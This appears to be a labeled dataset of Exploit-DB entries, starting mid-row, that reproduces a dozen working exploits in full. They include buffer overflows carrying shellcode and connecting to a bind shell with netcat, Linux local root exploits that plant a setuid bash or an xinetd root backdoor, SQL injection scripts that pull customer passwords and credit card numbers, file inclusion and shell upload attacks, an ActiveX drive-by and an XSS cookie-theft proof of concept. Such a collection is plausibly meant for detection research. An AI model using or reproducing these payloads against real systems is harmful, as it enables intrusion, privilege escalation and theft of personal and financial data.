pack('V',0x7C874413);     	# JMP ESP - kernel32.dll $nops 		= ""\x90"" x 20; 			# 20 nops. $exploit   	= $junk.""w00tw00t"".$shellcode.$ret.$nops.$egghunter;  if ($socket = IO::Socket::INET->new      (PeerAddr => $target,       PeerPort => $port,       Proto => ""TCP"")) {         $header =         ""GET / HTTP/1.1\r\n"".         ""Host: "".$target."" \r\n"".         ""Connection:"".$exploit.""\r\n""; 	print ""\n[+] Sending buffer ("".(length($exploit))."" bytes) to: $target:$port \n"";         print $socket $header.""\r\n"";         sleep(1);         close($socket); 	print ""[+] Exploitation Done!\n""; 	print ""[+] Please, wait couple of sec ...\n""; 	sleep(15); 	print ""[+] Got shell?\n\n"";         $command = ""nc $target 4444"";         system ($command); }   else {     print ""[-] Connection to $target failed!\n""; }",Simple Web Server,1
40670,"PCMan FTP Server 2.0.7 - 'DELETE' Remote Buffer Overflow from ftplib import FTP  print '''                 ##############################################                 #    Created: ScrR1pTK1dd13                  #                 #    Name: Greg Priest                       #                 #    Mail: ScrR1pTK1dd13.slammer@gmail.com   #                  ##############################################  # Exploit Title: PCmanftpd_delete_command_remotecode_exploit_Win7_x64_HUN_ENG # Date: 2016.10.31 # Exploit Author: Greg Priest # Version: Pcmanftpd 2.0.7 # Tested on: Windows 7 Enterprise x64 HUN/ENG ''' ftp_ip = raw_input(""FTP server IP:"") overflow = 'A' * 2005  eip = '\xCA\x96\xC9\x76' + '\x90' * 10 shellcode=( ""\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9"" + ""\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab"" + ""\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71"" + ""\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09"" + ""\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c"" + ""\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e"" + ""\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78"" + ""\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22"" + ""\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f"" + ""\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28"" + ""\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50"" + ""\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4"" + ""\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56"" + ""\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56"" + ""\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16"" + ""\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea"" + ""\xa5\x59\x50"") remotecode = overflow + eip + shellcode ftp = FTP(ftp_ip) ftp.login('anonymous', 'hacker@hacker.net') print ftp.login print ''' Successfull Exploitation! ''' FTP.delete(ftp, remotecode)",PCMan FTP Server,1
43365,Joomla! Component NextGen Editor 2.1.0 - 'plname' SQL Injection # # # # # # Exploit Title: Joomla! Component NextGen Editor 2.1.0 - SQL Injection # Dork: N/A # Date: 19.12.2017 # Vendor Homepage: hhttp://nextgeneditor.com/ # Software Link: https://extensions.joomla.org/extension/nextgen-editor/ # Software Download: http://nextgeneditor.com/index.php/en/testcategory/send/2-nge-editor-full/33-nextgeneditor-full-free # Version: 2.1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) # http://localhost/[PATH]/index.php?option=com_nge&view=config&plname=[SQL] #   # %22%20%20%2f%2a%21%30%37%37%37%37%50%72%6f%63%65%64%75%72%65%2a%2f%20%2f%2a%21%30%37%37%37%37%41%6e%61%6c%79%73%65%2a%2f%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%2800%2c%2f%2a%21%30%37%37%37%37%63%6f%6e%63%61%74%2a%2f%280x27%2c0x496873616e2053656e63616e%2c0x3a%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c0%29%2d%2d%20%2d #  # # # # #,Joomla! Component NextGen Editor,1
290,"GLIBC 2.1.3 - 'LD_PRELOAD' Local Privilege Escalation #!/bin/tcsh # przyklad wykorzystania dziury w LD_PRELOAD # shadow (tested on redhat 6.0, should work on others)  if ( -e /etc/initscript ) echo uwaga: /etc/initscript istnieje cd /lib umask 0 setenv LD_PRELOAD libSegFault.so setenv SEGFAULT_OUTPUT_NAME /etc/initscript echo czekaj... to moze chwile potrwac... while (! -e /etc/initscript )   ( userhelper >& /dev/null & ; killall -11 userhelper >& /dev/null ) > /dev/null end  echo utworzylem plik initscript  cat > /etc/initscript << _init_ cp /bin/bash /var/tmp/.nothing chmod 6755 /var/tmp/.nothing rm /etc/initscript _init_  echo i nawet go podmienilem  # milw0rm.com [2001-03-04]",GLIBC,1
4094,"RKD Software BarCode ActiveX Control 'BarCodeAx.dll' 4.9 - Remote Overflow :. GOODFELLAS Security Research TEAM  .: :. http://goodfellas.shellcode.com.ar .:  BarCodeAx.dll v. 4.9 ActiveX Control Remote Stack Buffer Overflow  ================================================================= Internal ID: VULWAR200706223   Introduction ------------ BarCodeAx.dll is a library included in the Barcode ActiveX software  package from the Company RKD: (http://www.barcodetools.com/barcode/barcode-activex/barcode-activex.html)  Such package allows to manage the printing of different barcodes.  One of the BarcodeAx.dll exported methods is vulnerable to a stack buffer overflow which can be remotely exploited.   tested in --------- - Windows XP SP2 english/french with IE 6.0 / 7.0 - windows vista Professional SP1 with IE 7.0   Summary ------- The BeginPrint method fail to correctly check the size of the arguments  that receives, causing a stack buffer overflow.   Impact ------ Any application that uses the said ActiveX to control barcodes would be  exposed to remote code execution.   Workaround ---------- - Activate the Kill bit zero in CLSID:C26D9CA8-6747-11D5-AD4B-C01857C10000 - Unregister BarCodeAx.dll using regsvr32   Timeline -------- June 21, 2007 -- Bug discovery June 22, 2007 -- Bug published   Credits -------  * callAX <callax@shellcode.com.ar>  * GoodFellas Security Research Team <goodfellas.shellcode.com.ar>   Technical Detail ----------------  Vulnerable method.  Sub BeginPrint (  	ByVal name  As String  )   We need 656 bytes to overflow the buffer and rewrite EBP + EIP.  - Reversing 7C97DF40	PUSH 0 7C97DF42	PUSH ESI 7C97DF43	CALL 7C97CDC9 7C97DF48	MOV EBX,[EBP+10] 7C97DF4B	LEA EDI,[EBX-8] 7C97DF4E	MOV [EBP-2C],EDI 7C97DF51	MOVZX EAX,WORD PTR [EDI]	  <--- CRASH 7C97DF54	SHL EAX,3 7C97DF57	MOV [EBP-30],EAX 7C97DF5A	PUSH 7C97E11C 7C97DF5F	PUSH EDI 7C97DF60	PUSH ESI 7C97DF61	CALL 7C97CC6D 7C97DF66	TEST AL,AL 7C97DF68	JE 7C97E0BF  - Registers EIP 41414141 EAX C0040204 EBX 00407830 -> 003E977D ECX 0013ECE8 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA EDX 00150608 -> 7C98C500 EDI 00000000 ESI 001844CC -> 00180008 EBP 41414141 ESP 0013EBE8 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    Basic Crafted Html File -----------------------  <object classid='clsid:C26D9CA8-6747-11D5-AD4B-C01857C10000' id='Crash'></object>  <input language=VBScript onclick=Boom() type=button value=""Dale callAX!"">  <script language = 'vbscript'>  Sub Boom()     <!-- This exploit opens the port 4444. Thanks to Metasploit for Shellcode -->                                                             malicious_buffer  = String(656, ""x"")        eip               = unescape(""%EB%AA%3F%7E"")    noping            = String(10, unescape(""%90""))   shellcode =    unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _                unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _                unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _                unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _                unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4c%56%4b%4e"") & _                unescape(""%4d%54%4a%4e%49%4f%4f%4f%4f%4f%4f%4f%42%56%4b%48"") & _                unescape(""%4e%56%46%32%46%32%4b%38%45%44%4e%53%4b%58%4e%37"") & _                unescape(""%45%30%4a%57%41%30%4f%4e%4b%48%4f%34%4a%51%4b%58"") & _                unescape(""%4f%35%42%52%41%50%4b%4e%49%54%4b%48%46%53%4b%48"") & _                unescape(""%41%50%50%4e%41%33%42%4c%49%59%4e%4a%46%38%42%4c"") & _                unescape(""%46%37%47%50%41%4c%4c%4c%4d%30%41%30%44%4c%4b%4e"") & _                unescape(""%46%4f%4b%53%46%55%46%42%4a%52%45%57%45%4e%4b%58"") & _                unescape(""%4f%35%46%32%41%30%4b%4e%48%56%4b%58%4e%30%4b%44"") & _                unescape(""%4b%58%4f%55%4e%51%41%50%4b%4e%43%50%4e%32%4b%48"") & _                unescape(""%49%38%4e%56%46%42%4e%31%41%46%43%4c%41%53%4b%4d"") & _                unescape(""%46%36%4b%58%43%54%42%43%4b%48%42%44%4e%50%4b%58"") & _                unescape(""%42%47%4e%51%4d%4a%4b%38%42%54%4a%30%50%35%4a%56"") & _                unescape(""%50%48%50%54%50%30%4e%4e%42%55%4f%4f%48%4d%48%46"") & _                unescape(""%43%35%48%56%4a%36%43%33%44%53%4a%46%47%47%43%37"") & _                unescape(""%44%43%4f%45%46%55%4f%4f%42%4d%4a%46%4b%4c%4d%4e"") & _                unescape(""%4e%4f%4b%43%42%55%4f%4f%48%4d%4f%35%49%48%45%4e"") & _                unescape(""%48%56%41%38%4d%4e%4a%30%44%50%45%45%4c%36%44%50"") & _                unescape(""%4f%4f%42%4d%4a%46%49%4d%49%50%45%4f%4d%4a%47%55"") & _                unescape(""%4f%4f%48%4d%43%55%43%35%43%35%43%55%43%45%43%54"") & _                unescape(""%43%55%43%54%43%45%4f%4f%42%4d%48%56%4a%56%41%41"") & _                unescape(""%4e%45%48%46%43%55%49%48%41%4e%45%39%4a%36%46%4a"") & _                unescape(""%4c%31%42%37%47%4c%47%55%4f%4f%48%4d%4c%46%42%41"") & _                unescape(""%41%55%45%35%4f%4f%42%4d%4a%46%46%4a%4d%4a%50%32"") & _                unescape(""%49%4e%47%35%4f%4f%48%4d%43%55%45%55%4f%4f%42%4d"") & _                unescape(""%4a%36%45%4e%49%34%48%48%49%54%47%45%4f%4f%48%4d"") & _                unescape(""%42%35%46%35%46%55%45%45%4f%4f%42%4d%43%39%4a%46"") & _                unescape(""%47%4e%49%37%48%4c%49%57%47%35%4f%4f%48%4d%45%45"") & _                unescape(""%4f%4f%42%4d%48%56%4c%36%46%56%48%56%4a%46%43%46"") & _                unescape(""%4d%56%49%38%45%4e%4c%56%42%45%49%35%49%42%4e%4c"") & _                unescape(""%49%38%47%4e%4c%46%46%54%49%38%44%4e%41%33%42%4c"") & _                unescape(""%43%4f%4c%4a%50%4f%44%54%4d%32%50%4f%44%44%4e%32"") & _                unescape(""%43%49%4d%58%4c%57%4a%53%4b%4a%4b%4a%4b%4a%4a%46"") & _                unescape(""%44%57%50%4f%43%4b%48%41%4f%4f%45%57%46%44%4f%4f"") & _                unescape(""%48%4d%4b%55%47%55%44%55%41%45%41%45%41%45%4c%56"") & _                unescape(""%41%30%41%45%41%35%45%45%41%45%4f%4f%42%4d%4a%46"") & _                unescape(""%4d%4a%49%4d%45%30%50%4c%43%45%4f%4f%48%4d%4c%36"") & _                unescape(""%4f%4f%4f%4f%47%43%4f%4f%42%4d%4b%38%47%35%4e%4f"") & _                unescape(""%43%38%46%4c%46%46%4f%4f%48%4d%44%55%4f%4f%42%4d"") & _                unescape(""%4a%46%42%4f%4c%58%46%30%4f%45%43%35%4f%4f%48%4d"") & _                unescape(""%4f%4f%42%4d%5a"")    eat_this       = malicious_buffer + eip + noping + shellcode    Crash.BeginPrint eat_this  End Sub  </script>  # milw0rm.com [2007-06-22]",RKD Software BarCode ActiveX Control,1
24220,"IBM EGatherer 2.0 - ActiveX Control Dangerous Method source: https://www.securityfocus.com/bid/10562/info  It is reported that the IBM eGatherer ActiveX control contains dangerous methods that may result in a remote compromise of a system on which the ActiveX control is installed. These methods may be accessed by a malicious website and may result in the silent installation of a malicious executable.  A remote attacker may exploit this vulnerability in order to silently install a malicious executable on an affected system.  -----------EXAMPLE HTML 1 --------- //first this page would be viewed, then through refreshing or whatever one goes to the second page (or just timing the two calls with SetTimeOUt and putting them on the same page...) |object classid=""clsid:74FFE28D-2378-11D5-990C-006094235084"" id=""X""| |object|  |script| X.SetDebugging(""/../xx.hta"",-1); |script| ---------------------------------  -----------EXAMPLE HTML 2 --------- |object classid=""clsid:74FFE28D-2378-11D5-990C-006094235084"" id=""X""| |object|  |script| X.SetDebugging(""/../x<iframe src=http://www.malware.com>x.hta"",-1); |script|   ---------------------------------",IBM EGatherer,1
21865,"Interbase 5/6 - GDS_Lock_MGR UMask File Permission Changing // source: https://www.securityfocus.com/bid/5805/info  Interbase is a SQL database distributed and maintained by Borland. It is available for Unix and Linux operating systems.  The gds_lock_mgr program within Interbase is typically installed setuid. This program does not properly handle user-supplied umasks, and may allow the creation of files with insecure permissions as a privileged user.   // gds_lock_mgr easy local root compromise // All cobalt Linux affected, and certain mandrake installations. // Wouter ter Maat aka grazer - http://www.i-security.nl  #include <stdio.h> #include <string.h> #include <sys/types.h> #include <sys/stat.h> #include <sys/utsname.h>  #define BDPATH ""/etc/xinetd.d/xinetdbd"" #define GDSBIN ""/opt/interbase/bin/gds_lock_mgr""  int main() {  struct utsname buf; char path[24], lnc[34];   FILE *fd;  /* check for a rootshell on port 666 after the machine has rebooted.  * exploit written to work on a raq550 using xinetd  */  char *hexbd = ""\x73\x65\x72\x76\x69\x63\x65\x20\x78\x69\x6e\x65\x74\x64""               ""\x62\x64\n\x7b\n\x64\x69\x73\x61\x62\x6c\x65\x20\x3d\x20""               ""\x6e\x6f\n\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x20\x3d\x20\x36""               ""\x36\x36\n\x73\x6f\x63\x6b\x65\x74\x5f\x74\x79\x70\x65\x20""               ""\x3d\x20\x73\x74\x72\x65\x61\x6d\n\x77\x61\x69\x74\x20\x3d""               ""\x20\x6e\x6f\n\x75\x73\x65\x72\x20\x3d\x20\x72\x6f\x6f\x74""               ""\n\x73\x65\x72\x76\x65\x72\x20\x3d\x20\x2f\x62\x69\x6e\x2f""               ""\x73\x68\n\x73\x65\x72\x76\x65\x72\x5f\x61\x72\x67\x73\x20""               ""\x3d\x20\x2d\x69\n\x7d\n"";  fprintf(stdout, ""*** gds_lock_mgr local root exploit - grazer ***\n"");  uname(&buf); setenv(""INTERBASE"", ""/tmp"", 1);  sprintf(path, ""%s"", ""/tmp/isc_init1.""); strcat(path, buf.nodename);  chdir(""/tmp""); umask(000);  sprintf(lnc, ""ln %s -s %s"", BDPATH, path); system(lnc);  if(fd=fopen(GDSBIN, ""r"")) { system(GDSBIN); close(fd); } else { fprintf(stderr, ""%s not found...\n"", GDSBIN);  exit(0); }  if(fd=fopen(BDPATH, ""w"")) {  fprintf(stderr,""     exploit succesfull...\n""); fprintf(fd, ""%s"", hexbd); close(fd);} else { fprintf(stderr, ""exploit failed...\n"");  exit(0); }  }",Interbase,1
6343,"CMSbright - 'id_rub_page' SQL Injection ------------------------------------------- Script  :  CMSbright ..   site     :  http://www.cmsbright.com/   Author :  BorN To K!LL   Dork    :  powered by CMSbright Â© websens -------------------------------------------   Exploit   :   public/page.php?id_rub_page=[SQL]   Example :   public/page.php?id_rub_page=-9990+union+all+select+concat(version(),database(),user()),2,3,4--   -------------------------------------------   Greets :   Dr.2  ,  General C  ,  CcTero0liTi  ,  GolD_M .. & all my friends ..   -------------------------------------------  # milw0rm.com [2008-09-01]",CMSbright,1
38869,"WordPress Plugin TheCartPress 1.4.7 - Multiple Vulnerabilities ########################################### #-----------------------------------------# #[ 0-DAY Aint DIE | No Priv8 | KedAns-Dz ]# #-----------------------------------------# #     *----------------------------*      # #  K  |....##...##..####...####....|  .   # #  h  |....#...#........#..#...#...|  A   # #  a  |....#..#.........#..#....#..|  N   # #  l  |....###........##...#.....#.|  S   # #  E  |....#.#..........#..#....#..|  e   # #  D  |....#..#.........#..#...#...|  u   # #  .  |....##..##...####...####....|  r   # #     *----------------------------*      # #-----------------------------------------# #[ Copyright (c) 2015 | Dz Offenders Cr3w]# #-----------------------------------------# ########################################### # >>    D_x . Made In Algeria . x_Z    << # ########################################### # # [>] Title : Wordpress Plugin TheCartPress v1.4.7 Multiple Vulnerabilities # # [>] Author : KedAns-Dz # [+] E-mail : ked-h (@hotmail.com) # [+] FaCeb0ok : fb.me/K3d.Dz # [+] TwiTter : @kedans # # [#] Platform : PHP / WebApp # [+] Cat/Tag : Multiple # # [<] <3 <3 Greetings t0 Palestine <3 <3 # [!] Vendor : http://thecartpress.com # ########################################### # # [!] Description : # # Wordpress plugin TheCartPress v1.4.7 is suffer from multiple vulnerabilities # remote attacker can disclosure some local files or do a remote code execution. # ####  // page : Miranda.class.php // lines : 111.. 115  /* --[1] Local File Include -- */ <?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, ""http://[target].com/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00""); curl_setopt($ch, CURLOPT_HTTPGET, 1); curl_setopt($ch, CURLOPT_USERAGENT, ""Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)""); $buf = curl_exec ($ch); curl_close($ch); unset($ch); echo $buf; ?>  /* --[2] Remote Code Execution -- */ <?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, ""http://[target].com/wp/admin-ajax.php?action=tcp_miranda_save_admin_panel&class=[RCE]""); curl_setopt($ch, CURLOPT_HTTPGET, 1); curl_setopt($ch, CURLOPT_USERAGENT, ""Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)""); $buf = curl_exec ($ch); curl_close($ch); unset($ch); echo $buf; ?>  #### #  <! THE END ^_* ! , Good Luck all <3 | 0-DAY Aint DIE ^_^ !> #  Hassi Messaoud (30500) , 1850 city/hood si' elHaouass .<3 #--------------------------------------------------------------- # Greetings to my Homies : Meztol-Dz , Caddy-Dz , Kalashinkov3 ,  # Chevr0sky , Mennouchi.Islem , KinG Of PiraTeS , TrOoN , T0xic, # & Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz , Barbaros-DZ , & # & KnocKout , Angel Injection , The Black Divels , kaMtiEz  , & # & Evil-Dz , Elite_Trojan , MalikPc , Marvel-Dz , Shinobi-Dz, & # & Keystr0ke , JF , r0073r , CroSs , Inj3ct0r/Milw0rm 1337day &  # PacketStormSecurity * Metasploit * OWASP * OSVDB * CVE Mitre ; ####",WordPress Plugin TheCartPress,1
13748,"Joomla! Component com_annonces - Arbitrary File Upload #Title:Joomla Component com_annonces Upload Vulnerability # Author: Sid3^effects # Published: 2010-06-06 # email:shell_c99@yahoo.com # vendor url : http://joomla.clubnautiquemarine.fr/ # google dork : inurl:com_annonces ############################################################################             ooooo  .oooooo.  oooooo   oooooo     oooo          `888' d8P'  `Y8b  `888.    `888.     .8'           888 888           `888.   .8888.   .8'           888 888            `888  .8'`888. .8'           888 888             `888.8'  `888.8'            888 `88b    ooo      `888'    `888'          o888o `Y8bood8P'       `8'      `8'                                                --------------------------------------------------------------------------------------  #####################Sid3^effects aKa HaRi##################################  #Greetz to all Andhra Hackers and ICW Memebers[Indian Cyber Warriors]  #Thanks:*L0rd ÇrusAdêr*,d4rk-blu™®,R45C4L idi0th4ck3r,CR4C|< 008,M4n0j,MaYuR  #ShouTZ:kedar,dec0d3r,41.w4r10r       #spl shoutz:LiquidWorm,gunslinger_ :D    #Catch us at www.andhrahackers.com or www.teamicw.in  ############################################################################      Description :  Simple Ads manager. Registred user can place a classified ad with description, date , comments, photos and custom fields. Administrator manages the categories of classified ads, cutomizes fields in categories, validates the ads. The user receives an email after ad creation and after admin validation. User can modify its ad from the fronted. Front-end shows a view with ad details (2 template views possible), vendor email contact, and photos. This component has been developped for the yacht club of french navy whose members may sell their boat. Contact me if you find something wrong on the component to the email address ajulou at yahoo.fr or if you have translated the component in another language Module is able to view random or lasted ads ############################################################################     Xploit : Upload Vulnerability                STEP 1 : Register first :)       STEP 2 : Goto ""Submit an ad""option.      STEP 3 : The attacker can upload  a shell in the ITEM DESCRIPTION section and your shell gets executed :P              STEP 4 : Check your ad now in the particular category and find your shell :)    submit your ad :       DEMO URL :             http://server/index.php?option=com_annonces&view=edit&Itemid=1      Once uploaded you can check your ad :P        ############################################################################  #spl thks: exploit-db team #Sid3^effects",Joomla! Component,1
35122,"Social Share - 'postid' SQL Injection source: https://www.securityfocus.com/bid/45497/info  Social Share is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.   http://www.example.com/socialshare/postview.php? postid=-1 union select 1,2,3,4,5,6,7,8,9,10#",Social Share,1
28447,"osCommerce 2.1/2.2 - 'product_info.php' SQL Injection source: https://www.securityfocus.com/bid/19774/info  osCommerce is prone to an SQL-injection vulnerability because the application fails to sufficiently sanitize user-supplied data.   A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  #!/usr/bin/php -q -d short_open_tag=on <?  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  if ($argc<5) { echo ""\r\nExploit osCommerce < 2.2 Milestone 2 060817 by Perseus \r\n""; echo ""\r\nUsage: \r\n\r\n   php "".$argv[0]."" host path product_id whatinfo OPTIONS\r\n\r\n""; echo ""   host - target server (ip/hostname)\r\n""; echo ""   path - path to osCommerce\r\n""; echo ""   product_id - Valid product_id\r\n""; echo ""   whatinfo - pass for password, cc for credit card info, addr for address\r\n\r\n""; echo ""Options:\r\n\r\n""; echo ""   -D: Show debug or verbose on\r\n""; echo ""   -p[port]: specify a port other than 80\r\n""; echo ""   -P[ip:port]: specify a proxy\r\n\r\n""; echo ""Example:\r\n\r\n""; echo ""   php "".$argv[0]."" localhost /os2/catalog/ 2 pass\r\n""; echo ""   php "".$argv[0]."" 192.168.1.108 /os2/catalog/ 2 pass -p8080 -P192.168.1.108:3128 -D\r\n""; echo ""   php "".$argv[0]."" 192.168.1.108 /os2/catalog/ 2 cc -p8080 -P192.168.1.108:3128\r\n""; die; }   $host=$argv[1]; $path=$argv[2]; $products_id=$argv[3]; $whatinfo=$argv[4]; $port=80; $Debug=0; $proxy=""""; for ($i=5; $i<=$argc-1; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } if ($temp==""-D"") {   $tmp=str_replace(""-D"","""",$argv[$i]);   $Debug=1; } }  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}  if($Debug==1) {     echo ""Name\t: osCommerce Multiple Vulnerabilities\r\n"";     echo ""Date\t: August 17, 2006\r\n"";     echo ""Vendor\t: osCommerce\r\n"";     echo ""URL\t: http://www.oscommerce.com/\r\n"";     echo ""Version\t: osCommerce < 2.2 Milestone 2 060817\r\n"";     echo ""Risk\t: Multiple Vulnerabilities\r\n"";     echo ""Exploit\t: Customers Info, Pass, and Credit Info Disclosure\r\n"";     echo ""Author\t: Perseus\r\n"";     echo ""Compatibility\t: magic_quotes_gpc off, union supported\r\n"";     echo ""Greets\t: rgod, James Bercegay, str0ke, hdm, r57 \r\n""; }  // try if you can rewrite this code to attack osc with magic_quotes_gpc on // because I found it impossible for the moment. // this will make oscommerce people update their vuln servers right now.  $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;} $loop = 1000;  function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex, $Debug;   if ($proxy=='') {     if($Debug==1) echo ""\r\nProcessing packets directly...\r\n"";     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo ""\r\nNo response from "".$host."":"".$port.""\r\n""; die;     }   }   else {     $c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     if($Debug==1) echo ""\r\nProcessing packets using proxy "".$parts[0]."":"".$parts[1]."" ...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo ""\r\nNo response from proxy...\r\n"";die;     }   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }    fclose($ock);   #debug   #echo ""\r\n"".$html; }     $bl=0;     for($y=0;$y<=$loop;$y++) {         //1. get cookie         $out = ""GET "".$p.""product_info.php?products_id="".$products_id."" HTTP/1.1\r\n"";         $out .= ""Host: "".$host.""\r\n"";         $out .= ""Connection: Close\r\n\r\n"";         sendpacketii($out);         $e = explode(""Set-Cookie: osCsid="",$html);         $e2 = explode("";"",$e[1]);         $cookie = $e2[0];          //2. injection         if($whatinfo==""pass"") {          $sql=""999' UNION SELECT 0 , CONCAT( CHAR(77),'||||', customers_password, '^', customers_email_address,'|',customers_firstname,'|',customers_lastname,'|',customers_dob,'|',customers_telephone,  '^') , 0 , 0     FROM customers LIMIT "".$y."",1 /*"";          } elseif($whatinfo==""addr"") {          $sql=""999' UNION SELECT 0 , CONCAT( CHAR(77),'||||', entry_company, '^', entry_firstname,'|',entry_lastname,'|',entry_street_address,'|',entry_suburb,'|',entry_postcode,'|',entry_city,'|',entry_state,  '^') , 0 , 0     FROM address_book LIMIT "".$y."",1 /*"";          } elseif($whatinfo==""cc"") {          $sql=""999' UNION SELECT 0 , CONCAT( CHAR(77),'||||', cc_type, '^', cc_owner,'|',cc_number,'|',cc_expires,'|',billing_street_address,'|',billing_suburb,'|',billing_city,'|',billing_postcode,'|',billing_state,'|',billing_country,'^')  , 0 , 0     FROM orders LIMIT "".$y."",1 /*"";          }          $sql=urlencode($sql);         $data = ""id[0]="".$sql."""";         $data.=""&products_id="".$products_id."""";         $out = ""POST "".$p.""product_info.php?products_id="".$products_id.""&action=add_product&osCsid="".$cookie.""  HTTP/1.0\r\n"";         $out .= ""User-Agent: Googlebot/2.1\r\n"";         $out .= ""Host: "".$host.""\r\n"";         $out .= ""Accept: text/plain\r\n"";         $out .= ""Connection: Close\r\n"";         $out .= ""Content-Type: application/x-www-form-urlencoded\r\n"";         $out .= ""Cookie: "".$cookie.""\r\n"";         $out .= ""Content-Length: "".strlen($data).""\r\n\r\n"";         $out .= $data;         sendpacketii($out);          //3. get vals         $out = ""GET "".$p.""shopping_cart.php?osCsid="".$cookie."" HTTP/1.1\r\n"";         $out .= ""Host: "".$host.""\r\n"";         $out .= ""Connection: Close\r\n\r\n"";         sendpacketii($out);         //echo $html;         $e = explode(""M||||"",$html);         $e2 = explode(""^"",$e[1]);         $str = ""\r\n"".$y."". "".$e2[0]."" "".$e2[1].""\r\n"";         echo $str;         $strl = strlen($str);         if($strl<=25) $bl++;         if($bl==3) break;      }  ?>","osCommerce\r\n"";",0
15387,"Webmedia Explorer 6.13.1 - Persistent Cross-Site Scripting Vulnerability ID: HTB22661 Reference: http://www.htbridge.ch/advisory/stored_xss_vulnerability_in_webmedia_explorer.html Product: Webmedia Explorer Vendor: Marc Salmurri ( http://www.webmediaexplorer.com/ )  Vulnerable Version: 6.13.1 and probably prior versions Vendor Notification: 19 October 2010  Vulnerability Type: Stored XSS (Cross Site Scripting) Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response Risk level: Medium  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   Vulnerability Details: User can execute arbitrary JavaScript code within the vulnerable application.  The vulnerability exists due to failure in the ""6.13.1!"">"" script to properly sanitize user-supplied input in ""desc"" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.  An attacker can use browser to exploit this vulnerability. The following PoC is available:  <form action=""http://host/folder"" method=""post"" name=""main""> <input type=""hidden"" name=""object"" value=""folder""> <input type=""hidden"" name=""desc"" value='title""><script>alert(document.cookie)</script>'> <input type=""hidden"" name=""tags"" value=""""> <input type=""hidden"" name=""position"" value=""""> <input type=""hidden"" name=""readme"" value=""post txt""> </form> <script> document.main.submit(); </script>",Webmedia Explorer,1
